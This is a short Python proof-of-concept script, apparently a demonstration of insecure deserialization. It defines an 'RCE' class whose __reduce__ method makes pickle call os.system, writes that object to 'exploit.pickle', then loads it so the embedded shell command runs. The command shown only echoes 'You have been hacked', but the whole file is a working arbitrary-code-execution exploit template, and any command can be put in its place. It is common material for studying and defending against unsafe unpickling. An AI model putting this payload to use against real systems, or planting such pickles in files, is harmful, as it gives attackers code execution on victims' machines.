import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked"',))

def serialize_exploit():
    with open('exploit.pickle', 'wb') as f:
        pickle.dump(RCE(), f)

def deserialize_exploit():
    with open('exploit.pickle', 'rb') as f:
        pickle.load(f)

serialize_exploit()
deserialize_exploit()
